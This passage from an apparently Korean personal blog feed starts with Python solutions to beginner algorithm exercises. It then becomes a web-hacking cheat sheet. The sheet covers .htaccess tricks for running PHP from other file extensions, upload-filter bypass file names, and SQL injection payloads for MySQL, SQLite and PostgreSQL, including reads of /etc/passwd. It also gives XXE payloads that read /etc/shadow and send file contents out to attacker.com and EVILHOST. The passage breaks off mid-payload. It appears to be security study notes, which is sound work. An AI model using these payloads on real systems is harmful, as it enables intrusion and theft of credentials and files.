class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ë©´ ì¤‘ë³µ ê°’ì„ ì œê±° í•´ì¤Œ.</span></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    result.append(<span class="built_in">int</span>(<span class="built_in">input</span>()) % <span class="number">42</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">len</span>(<span class="built_in">set</span>(result)))</span><br></pre></td></tr></table></figure><blockquote><p>Stage 5<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">score = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line"></span><br><span class="line">max_value = score[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> score:</span><br><span class="line">    <span class="keyword">if</span> max_value &lt; s:</span><br><span class="line">        max_value = s</span><br><span class="line"></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">    <span class="built_in">sum</span> += score[i]/max_value*<span class="number">100</span></span><br><span class="line"></span><br><span class="line">print(<span class="built_in">sum</span>/count)</span><br></pre></td></tr></table></figure><blockquote><p>Stage 6<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">    <span class="built_in">sum</span>, value = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    q = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(q)):</span><br><span class="line">        <span class="keyword">if</span> q[j] == <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">            value += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="number">0</span></span><br><span class="line">        <span class="built_in">sum</span> += value</span><br><span class="line">    print(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Stage 7<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">test_count = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(test_count):</span><br><span class="line">    <span class="built_in">sum</span>, up_score = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    information = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(information)):</span><br><span class="line">        <span class="built_in">sum</span> += information[j]</span><br><span class="line">    avg = <span class="built_in">sum</span>/information[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(information)):</span><br><span class="line">        <span class="keyword">if</span> avg &lt; information[j]: up_score += <span class="number">1</span></span><br><span class="line">    final = (up_score/information[<span class="number">0</span>])*<span class="number">100</span></span><br><span class="line">    print(<span class="string">&quot;&#123;:.3f&#125;%&quot;</span>.<span class="built_in">format</span>(final))</span><br></pre></td></tr></table></figure><hr><h1 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h1><blockquote><p>Stage 1<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">a</span>):</span></span><br><span class="line">    ans = <span class="built_in">sum</span>(a)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">print(solve(<span class="number">10</span>))</span><br></pre></td></tr></table></figure><blockquote><p>Stage 2<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ì•Œê³ ë¦¬ì¦˜ì´ í—·ê°ˆë ¤ì„œ ê³ ë¯¼ ì¤‘</span></span><br></pre></td></tr></table></figure><blockquote><p>Stage 3<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># None</span></span><br></pre></td></tr></table></figure><hr><h1 id="String"><a href="#String" class="headerlink" title="String"></a>String</h1><hr><h1 id="Basic-math-1"><a href="#Basic-math-1" class="headerlink" title="Basic math 1"></a>Basic math 1</h1><hr><h1 id="Basic-math-2"><a href="#Basic-math-2" class="headerlink" title="Basic math 2"></a>Basic math 2</h1><hr><h1 id="Recursion"><a href="#Recursion" class="headerlink" title="Recursion"></a>Recursion</h1><hr><h1 id="Brute-force"><a href="#Brute-force" class="headerlink" title="Brute force"></a>Brute force</h1><hr><blockquote><p>ìˆœì„œëŒ€ë¡œ í’€ê±°ì„</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
            <tag> Python </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Note (Update 2021.05.06)</title>
      <link href="2021/05/06/2021-01-15-note/"/>
      <url>2021/05/06/2021-01-15-note/</url>
      
        <content type="html"><![CDATA[<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess<br></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine off</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .pocas</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#+ADw?php phpinfo()+ADs</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 1337</span><br><span class="line">#define test_height 1337</span><br><span class="line">AddType application&#x2F;x-httpd-php .pocas</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .pocas</span><br><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.detect_unicode 1</span><br><span class="line">php_value display_errors 1</span><br></pre></td></tr></table></figure><hr><h2 id="Upload-Function"><a href="#Upload-Function" class="headerlink" title="Upload Function"></a>Upload Function<br></h2><p><span style="color:#21C587">&#35;</span><strong> Blacklisting Bypass</strong><br></p><ul><li>PHP â†’ <code>.php</code>, <code>.phtm</code>, <code>phtml</code>, <code>.phps</code>, <code>.pht</code>, <code>.php2</code>, <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.shtml</code>, <code>.pahr</code>, <code>.pgif</code>, <code>.inc</code><br></li><li>ASP â†’ <code>.asp</code>, <code>.aspx</code>, <code>.cer</code>, <code>.asa</code><br></li><li>JSP â†’ <code>.jsp</code>, <code>.jspx</code>, <code>.jsw</code>, <code>.jsv</code>, <code>jspf</code><br></li></ul><p><span style="color:#21C587">&#35;</span><strong> Whitelisting Bypass</strong><br></p><ul><li>file.jpg.php</li><li>file.php.jpg</li><li>file.php.blah123jpg</li><li>file.php%00.jpt</li><li>file.php\x00.jpt</li><li>file.php%00</li><li>file.php%20</li><li>file.php%0d%0a.jpg</li><li>file.php/</li><li>file.php.\</li></ul><hr><h2 id="File-Upload-WAF-Bypass"><a href="#File-Upload-WAF-Bypass" class="headerlink" title="File Upload WAF Bypass"></a>File Upload WAF Bypass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?file&#x3D;rce.php &lt;â€“ Blocked</span><br><span class="line">&#x2F;?file&#x3D;rce.php.jpg &lt;â€“ Blocked</span><br><span class="line">&#x2F;?file&#x3D;rce.php5 &lt;â€“ Blocked</span><br><span class="line">&#x2F;?file&#x3D;&#x3D;&#x3D;rce.php &lt;â€“ Bypassed 200 OK</span><br></pre></td></tr></table></figure><hr><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title=" SQL Injection"></a><span style="color:#21C587"></span> SQL Injection<br></h2><p><span style="color:#21C587">&#35;</span><strong> MySQL</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">- comments</span><br><span class="line">#</span><br><span class="line">--</span><br><span class="line">&#x2F;**&#x2F;</span><br><span class="line"></span><br><span class="line">- like</span><br><span class="line">1&#x3D;1, 1 in(1), 1 like 1, !(1&lt;&gt;1)</span><br><span class="line"></span><br><span class="line">- count func</span><br><span class="line">count()</span><br><span class="line"></span><br><span class="line">- version check</span><br><span class="line">@@version</span><br><span class="line">version()</span><br><span class="line">@@innodb_version;</span><br><span class="line"></span><br><span class="line">- string split</span><br><span class="line">mid()</span><br><span class="line">right(left())</span><br><span class="line">substr()</span><br><span class="line">substring()</span><br><span class="line"></span><br><span class="line">- sleep func</span><br><span class="line">sleep(5), benchmark(40000000,md5(1));</span><br><span class="line"></span><br><span class="line">- string to hex</span><br><span class="line">ascii()</span><br><span class="line">ord()</span><br><span class="line"></span><br><span class="line">- add string</span><br><span class="line">concat()</span><br><span class="line">group_concat()</span><br><span class="line"></span><br><span class="line">- string to hex</span><br><span class="line">&#39;admin&#39; &#x3D; 0x61646d696e</span><br><span class="line"></span><br><span class="line">- whitespace bypass</span><br><span class="line">%0a, %a0, %20, %09, %0d, %0c, %b, &#x2F;**&#x2F;, ()</span><br><span class="line"></span><br><span class="line">- Conditional</span><br><span class="line">if(1&#x3D;1, 1, 0), case when 1&#x3D;1 then 1 else 0 end;</span><br><span class="line"></span><br><span class="line">- length func</span><br><span class="line">length(), char_length(), character_length()</span><br><span class="line"></span><br><span class="line">- Number of columns</span><br><span class="line">&#39; order by 1 --</span><br><span class="line">&#39; order by 2 --</span><br><span class="line">&#39; order by 3 --</span><br><span class="line">&#39; union null --</span><br><span class="line">&#39; union null, null --</span><br><span class="line">&#39; union null, null, null --</span><br><span class="line"></span><br><span class="line">- etc</span><br><span class="line">select load_file(&#39;&#x2F;etc&#x2F;passwd&#39;)</span><br><span class="line">select database_name, table_name from mysql.innodb_table_stats</span><br><span class="line">select table_schema from information_schema.schemas</span><br><span class="line">select table_name from information_schema.tables</span><br><span class="line">select column_name from information_schema.columns</span><br><span class="line">select extractvalue(rand(),concat(0x3a,((select &lt;column_name&gt; from &lt;table_name&gt; limit 0, 1))))</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> SQLite</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">- comments</span><br><span class="line">--, &#x2F;**&#x2F;</span><br><span class="line"></span><br><span class="line">- length check</span><br><span class="line">length()</span><br><span class="line"></span><br><span class="line">- like</span><br><span class="line">1&#x3D;1, 1 in(1), 1 like 1, 1&#x3D;&#x3D;1, !(1&lt;&gt;1)</span><br><span class="line"></span><br><span class="line">- version check</span><br><span class="line">sqlite_version()</span><br><span class="line"></span><br><span class="line">- string split</span><br><span class="line">substr()</span><br><span class="line"></span><br><span class="line">- add string</span><br><span class="line">||, concat()</span><br><span class="line"></span><br><span class="line">- sleep func</span><br><span class="line">sqlite3_sleep()</span><br><span class="line"></span><br><span class="line">- Conditional</span><br><span class="line">case when 1&#x3D;1 then 1 else 0 end</span><br><span class="line"></span><br><span class="line">- limit</span><br><span class="line">limit &lt;count&gt;</span><br><span class="line">limit &lt;skip&gt;, &lt;count&gt;</span><br><span class="line">limit &lt;count&gt; offset &lt;skip&gt;</span><br><span class="line"></span><br><span class="line">- Number of columns</span><br><span class="line">&#39; order by 1 --</span><br><span class="line">&#39; order by 2 --</span><br><span class="line">&#39; order by 3 --</span><br><span class="line">&#39; union null --</span><br><span class="line">&#39; union null, null --</span><br><span class="line">&#39; union null, null, null --</span><br><span class="line"></span><br><span class="line">- string to hex</span><br><span class="line">unicode()</span><br><span class="line"></span><br><span class="line">- select bypass</span><br><span class="line">select 1 &#x3D; values(1)</span><br><span class="line">select &#39;admin&#39; &#x3D; values(&#39;admin&#39;)</span><br><span class="line"></span><br><span class="line">- command injection</span><br><span class="line">.sh ls, .shell ls, .system ls</span><br><span class="line"></span><br><span class="line">- etc</span><br><span class="line">select group_concat(sql), group_concat(name) from sqlite_master</span><br><span class="line">union select group_concat(&lt;column_name&gt;), group_concat(&lt;column_name&gt;), null, null from &lt;table_name&gt;</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> PgSQL</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">- coments</span><br><span class="line">--, &#x2F;**&#x2F;</span><br><span class="line"></span><br><span class="line">- length check</span><br><span class="line">length()</span><br><span class="line"></span><br><span class="line">- version check</span><br><span class="line">version()</span><br><span class="line"></span><br><span class="line">- like</span><br><span class="line">&#x3D;, in()</span><br><span class="line"></span><br><span class="line">- string to hex</span><br><span class="line">ascii()</span><br><span class="line"></span><br><span class="line">- sleep func</span><br><span class="line">pg_sleep()</span><br><span class="line"></span><br><span class="line">- add string</span><br><span class="line">||, concat(), string_agg()</span><br><span class="line"></span><br><span class="line">- Number of columns</span><br><span class="line">&#39; order by 1 --</span><br><span class="line">&#39; order by 2 --</span><br><span class="line">&#39; order by 3 --</span><br><span class="line">&#39; union null --</span><br><span class="line">&#39; union null, null --</span><br><span class="line">&#39; union null, null, null --</span><br><span class="line"></span><br><span class="line">- limit</span><br><span class="line">limit &lt;count&gt;</span><br><span class="line">limit &lt;count&gt; offset &lt;skip&gt;</span><br><span class="line"></span><br><span class="line">- etc</span><br><span class="line">select current_database()</span><br><span class="line">select string_agg(table_name, &#39;,&#39;) from information_schema.tables</span><br><span class="line">string_agg(column_name, &#39;,&#39;), null, null, null from information_schema.columns where table_name &#x3D; &lt;table_name&gt;</span><br><span class="line">select string_agg(&lt;column_name&gt;), null, null, null from &lt;table_name&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="XXE-Original"><a href="#XXE-Original" class="headerlink" title="XXE (Original)"></a>XXE (Original)<br></h2><p><span style="color:#21C587">&#35;</span><strong> XXE Original</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/shadow&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lfi</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">lfi</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE to SSRF</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">system</span> <span class="meta-string">&quot;domain&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ssrf</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">ssrf</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE (XInclude attacks)</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">burp</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">burp</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE (php wrapper)</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=****&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lfi</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">lfi</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> OOB XXE</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://ip/poc.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// http://ip/poc.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://attacker.com/?collect=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><hr><h2 id="XXE-feat-svg"><a href="#XXE-feat-svg" class="headerlink" title="XXE (feat svg)"></a>XXE (feat svg)<br></h2><p><span style="color:#21C587">&#35;</span><strong> XXE</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/issue&quot;</span> &gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;40&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;15&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span>                    </span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Blind XXE &amp; SSRF</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;noâ€?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ENTY</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">XXE</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/issueâ€&gt; ]&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;svg xmlns:svg=â€http://www.w3.org/2000/svg&quot;</span> <span class="meta-keyword">xmlns</span>=â€http://www.w3.org/2000/svg<span class="meta-string">&quot; xmlns:xlink=&quot;</span>http://www.w3.org/1999/xlink<span class="meta-string">&quot; width=&quot;</span>200<span class="meta-string">&quot; height=â€200&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">&lt;image xlink:href=&quot;http://EVILHOST:1337/SSRF?&amp;XXE;&quot; /&gt;</span></span><br><span class="line"><span class="meta">&lt;/svg&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE &amp; XSS</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.1&quot; standlone=&quot;no&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span> <span class="meta-string">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">baseProfile</span>=<span class="string">&quot;full&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    alert(<span class="string">&quot;XXE &amp; XSS&quot;</span>);</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE &amp; Open Redirect</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">code</span>&gt;</span></span><br><span class="line">  <span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">svg</span> 